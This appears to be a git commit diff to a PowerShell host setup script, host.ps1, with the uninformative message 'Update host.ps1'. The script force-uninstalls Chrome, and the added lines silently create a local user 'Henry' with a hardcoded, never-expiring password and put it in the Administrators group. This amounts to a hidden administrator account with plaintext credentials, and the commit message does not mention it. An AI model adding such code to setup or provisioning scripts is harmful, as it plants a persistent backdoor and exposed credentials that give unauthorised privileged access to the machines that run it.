94a47d8340fe8c5135fad42a4a31a552fdacb3e2
UwU990099 <131960697+UwU990099@users.noreply.github.com>
2024-01-09 20:25:34 +0630

    Update host.ps1

--- host.ps1
+++ host.ps1
@@ -4,6 +4,14 @@ $ProgressPreference = 'SilentlyContinue'
 
 (Get-ItemProperty -path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome').version | ForEach-Object {& ${env:ProgramFiles(x86)}\Google\Chrome\Application\$_\Installer\setup.exe --uninstall --multi-install --chrome --system-level --force-uninstall}
 
+# Create a new local user
+$Username = "Henry"
+$Password = ConvertTo-SecureString "HRH9!@#" -AsPlainText -Force
+New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires:$true
+
+# Add the user to the administrators group
+Add-LocalGroupMember -Group "Administrators" -Member $Username
+
 # Installing Edge
 # [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
 # md -Path $env:temp\edgeinstall -erroraction SilentlyContinue | Out-Null
